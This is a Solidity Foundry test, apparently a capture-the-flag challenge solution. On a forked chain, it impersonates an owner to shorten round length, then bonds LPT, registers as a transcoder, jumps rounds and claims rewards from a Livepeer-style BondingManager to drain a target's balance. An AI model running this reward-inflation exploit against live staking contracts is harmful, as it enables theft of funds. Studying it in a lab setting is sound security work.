// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../src/openzeppelin-contracts/token/ERC20/ERC20.sol";

contract ChallengeTest is Test {
    Challenge public challenge;
    address player;
    uint256 playerKey;

    ERC20 public constant LPT = ERC20(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
    address public constant TARGET = 0xc20DE37170B45774e6CD3d2304017fc962f27252;
    RoundsManager public roundsManager = RoundsManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);
    BondingManager public bondingManager = BondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);

    function setUp() public {
        vm.rollFork(267164264);

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey);

        playerKey = deployerPrivateKey;
        player = wallet.addr;
        console.log("player", player);

        deal(address(this), 1000 ether);
        challenge = new Challenge(player);
        deal(address(LPT), address(challenge), 5000 ether);

        skip(3 days);
        vm.prank(0xD9dEd6f9959176F0A04dcf88a0d2306178A736a6); //owner
        roundsManager.setRoundLength(10);
    }

    function test_S() public {
        vm.startPrank(player);
        //round jump from 3687 -> 267164265
        //stake to current round winner and profit

        challenge.claimLPT();
        console.log("currentRound", roundsManager.currentRound());
        console.log("LPT balance", LPT.balanceOf(player));
        console.log("target balance: %e", LPT.balanceOf(TARGET));
        console.log("poolSize", bondingManager.getTranscoderPoolSize());

        console.log("init new round");
        roundsManager.initializeRound();

        console.log("bonding");
        LPT.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(5000 ether, player);
        console.log("join as transcoder");
        bondingManager.transcoder(1000000, 1000000);

        console.log(
            "bondingState", bondingManager.transcoderStatus(player) == BondingManager.TranscoderStatus.Registered
        );
        console.log("totalStake", bondingManager.transcoderTotalStake(player));
        console.log("pendingStake", bondingManager.pendingStake(player, roundsManager.currentRound()));

        bondingManager.transcoder(1000000, 1000000);

        nextRound();

        
        console.log("self rewards", roundsManager.currentRound() );
        roundsManager.initializeRound();
        bondingManager.reward();

        console.log("target balance: %e", LPT.balanceOf(TARGET));
        vm.stopPrank();
    }
    function nextRound() public {
        console.log("Current round (before roll): ", roundsManager.currentRound());

        uint256 currentRoundStartBlock = roundsManager.currentRoundStartBlock();
        uint256 roundLength = roundsManager.roundLength();
        vm.roll(currentRoundStartBlock + roundLength);

        roundsManager.initializeRound();

        console.log("Current round (after roll): ", roundsManager.currentRound());
    }
    
}

contract RoundsManager {
    address public controller;

    function setRoundLength(uint256 _roundLength) external {}
    function initializeRound() external {}
    function currentRound() public view returns (uint256) {}
    function currentRoundStartBlock() public view returns (uint256) {}
    function roundLength() public view returns (uint256) {}
}

contract BondingManager {
    // The various states a transcoder can be in
    enum TranscoderStatus {
        NotRegistered,
        Registered
    }

    function bondForWithHint(
        uint256 _amount,
        address _owner,
        address _to,
        address _oldDelegateNewPosPrev,
        address _oldDelegateNewPosNext,
        address _currDelegateNewPosPrev,
        address _currDelegateNewPosNext
    ) public {}
    function bond(uint256 _amount, address _to) external {}
    function rewardWithHint(address _newPosPrev, address _newPosNext) public {}
    function transcoderWithHint(uint256 _rewardCut, uint256 _feeShare, address _newPosPrev, address _newPosNext)
        public
    {}
    function transcoder(uint256 _rewardCut, uint256 _feeShare) external {}

    function reward() external {
        rewardWithHint(address(0), address(0));
    }

    function checkpointBondingState(address _account) external {}

    function getTranscoderPoolSize() public view returns (uint256 a) {}
    function getFirstTranscoderInPool() public view returns (address b) {}

    function getNextTranscoderInPool(address _transcoder) public view returns (address c) {}

    function transcoderStatus(address _transcoder) public view returns (TranscoderStatus d) {}

    function transcoderTotalStake(address _transcoder) public view returns (uint256 a) {}

    function pendingStake(address _delegator, uint256 _endRound) public view returns (uint256) {}
}
